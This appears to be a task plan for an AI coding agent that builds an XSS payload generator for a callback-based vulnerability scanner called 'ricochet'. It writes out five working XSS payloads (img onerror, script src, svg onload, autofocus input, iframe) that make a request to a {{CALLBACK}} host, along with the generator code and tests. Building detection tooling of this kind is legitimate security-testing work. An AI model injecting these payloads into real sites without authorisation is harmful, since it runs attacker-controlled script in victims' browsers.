---
phase: 06-vulnerability-payloads
plan: 01
type: execute
wave: 1
depends_on: []
files_modified:
  - ricochet/payloads/xss.py
  - ricochet/payloads/builtin/xss-callback.txt
autonomous: true

must_haves:
  truths:
    - "XSS payloads contain {{CALLBACK}} placeholder for correlation"
    - "XSS payloads use browser-native callback methods (img onerror, fetch, script src)"
    - "Generator yields payloads with vuln_type metadata"
  artifacts:
    - path: "ricochet/payloads/xss.py"
      provides: "XSS payload generator class"
      exports: ["XSSPayloadGenerator"]
    - path: "ricochet/payloads/builtin/xss-callback.txt"
      provides: "5 core XSS callback payloads"
      min_lines: 5
  key_links:
    - from: "ricochet/payloads/xss.py"
      to: "ricochet/payloads/builtin/xss-callback.txt"
      via: "load_payloads from ricochet.injection.payloads"
      pattern: "load_payloads.*xss-callback"
---

<objective>
Create XSS payload generator with browser-based callback embedding

Purpose: Generate XSS payloads that trigger HTTP callbacks when executed in browser context. These payloads detect stored/reflected XSS by phoning home rather than relying on visible indicators like alert().

Output: XSSPayloadGenerator class + 5 core XSS callback payloads in builtin file
</objective>

<execution_context>
@~/.claude/get-shit-done/workflows/execute-plan.md
@~/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/STATE.md
@.planning/phases/06-vulnerability-payloads/06-RESEARCH.md

@ricochet/injection/payloads.py
@ricochet/injection/injector.py
</context>

<tasks>

<task type="auto">
  <name>Task 1: Create XSS payload generator</name>
  <files>
    ricochet/payloads/xss.py
    ricochet/payloads/builtin/xss-callback.txt
  </files>
  <action>
Create the payloads module structure:

1. Create `ricochet/payloads/builtin/` directory if needed.

2. Create `ricochet/payloads/builtin/xss-callback.txt` with 5 core XSS callback payloads:
```
# XSS callback payloads - browser execution triggers HTTP request
# {{CALLBACK}} is replaced with callback_url/correlation_id at injection time
<img src=x onerror="fetch('{{CALLBACK}}')">
<script src="{{CALLBACK}}"></script>
<svg onload="fetch('{{CALLBACK}}')">
<input onfocus="fetch('{{CALLBACK}}')" autofocus>
<iframe src="{{CALLBACK}}">
```

3. Create `ricochet/payloads/xss.py` with XSSPayloadGenerator class:
- `generate(callback_url: str) -> Iterator[tuple[str, str]]` - yields (payload, context) tuples
- `vuln_type` property returns "xss"
- Load payloads from builtin file using `load_payloads()` from `ricochet.injection.payloads`
- Use pathlib to find builtin directory relative to module location: `Path(__file__).parent / "builtin"`

Pattern for generator:
```python
from pathlib import Path
from typing import Iterator
from ricochet.injection.payloads import load_payloads

class XSSPayloadGenerator:
    vuln_type = "xss"

    def generate(self, callback_url: str) -> Iterator[tuple[str, str]]:
        builtin_path = Path(__file__).parent / "builtin" / "xss-callback.txt"
        for payload in load_payloads(builtin_path):
            yield (payload, "html")  # context hint
```

Note: Do NOT create __init__.py in this plan - that will be created by Plan 06-04 after all generators exist.

Note: The {{CALLBACK}} placeholder substitution is handled by the Injector class (already implemented in ricochet/injection/injector.py:substitute_callback). The generator just provides raw payloads with placeholders.
  </action>
  <verify>
```bash
python -c "from ricochet.payloads.xss import XSSPayloadGenerator; g = XSSPayloadGenerator(); print(list(g.generate('http://test'))[:2])"
```
Should print 2 tuples of (payload_with_placeholder, context).
  </verify>
  <done>
- XSSPayloadGenerator importable from ricochet.payloads.xss
- generate() yields tuples of (payload, context)
- Payloads contain {{CALLBACK}} placeholder
- vuln_type returns "xss"
  </done>
</task>

<task type="auto">
  <name>Task 2: Add XSS payload tests</name>
  <files>tests/test_payloads_xss.py</files>
  <action>
Create tests for XSS payload generator:

1. Test generator yields non-empty list
2. Test all payloads contain {{CALLBACK}} placeholder
3. Test vuln_type property returns "xss"
4. Test each payload tuple has (str, str) format
5. Test minimum 5 payloads (matching builtin file)

Use pytest style. Import directly from ricochet.payloads.xss (not from ricochet.payloads since __init__.py doesn't exist yet).
  </action>
  <verify>
```bash
python -m pytest tests/test_payloads_xss.py -v
```
All tests pass.
  </verify>
  <done>
- Tests verify generator behavior
- Tests verify payload format (contains {{CALLBACK}})
- Tests verify vuln_type
- All tests pass
  </done>
</task>

</tasks>

<verification>
```bash
# Module imports correctly (direct import, not via __init__)
python -c "from ricochet.payloads.xss import XSSPayloadGenerator"

# Generator produces payloads
python -c "from ricochet.payloads.xss import XSSPayloadGenerator; g = XSSPayloadGenerator(); payloads = list(g.generate('http://test')); assert len(payloads) >= 5; print(f'{len(payloads)} XSS payloads loaded')"

# Payloads contain callback placeholder
python -c "from ricochet.payloads.xss import XSSPayloadGenerator; g = XSSPayloadGenerator(); assert all('{{CALLBACK}}' in p[0] for p in g.generate('http://test')); print('All payloads have callback placeholder')"

# Tests pass
python -m pytest tests/test_payloads_xss.py -v
```
</verification>

<success_criteria>
- XSSPayloadGenerator class exists and is importable from ricochet.payloads.xss
- Generator yields at least 5 XSS callback payloads
- All payloads contain {{CALLBACK}} placeholder
- vuln_type property returns "xss"
- Tests verify generator behavior
</success_criteria>

<output>
After completion, create `.planning/phases/06-vulnerability-payloads/06-01-SUMMARY.md`
</output>
